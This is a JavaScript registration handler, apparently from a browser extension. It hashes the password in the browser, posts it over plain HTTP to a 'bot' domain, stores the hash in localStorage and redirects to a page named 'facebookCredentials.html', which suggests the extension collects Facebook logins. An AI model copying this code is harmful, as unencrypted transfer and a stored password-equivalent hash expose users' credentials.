// loginRedirect.js
window.onload = function() {
    document.getElementById('registerForm').addEventListener('submit', function(event) {
        console.log('Form submission triggered');
        event.preventDefault();
        
        var username = document.getElementsByName('username')[0].value;
        var password = document.getElementsByName('psw')[0].value;
        var confirmPassword = document.getElementsByName('psw-repeat')[0].value;

        if (password !== confirmPassword) {
            alert('The passwords do not match!');
            return;
        }

        var hashedPassword = CryptoJS.SHA256(password).toString();

        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://bot.1568888.xyz/register.php', true);
        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                console.log('Server response:', xhr.responseText);
                var response = JSON.parse(xhr.responseText);
                if (xhr.status === 200 && response.status === 'success') {
                    localStorage.setItem('userId', response.userId.toString()); // Store the user ID returned from the server
                    localStorage.setItem('hashedPassword', hashedPassword); 
                    window.location.href = 'facebookCredentials.html';
                } else {
                    alert("Registration failed: " + (response.message || xhr.responseText));
                }
            }
        };         
        xhr.send('username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(hashedPassword));
    });

    document.getElementById('loginLink').addEventListener('click', function(event) {
        event.preventDefault();
        alert("Please click on the extension icon to log in.");
    });
};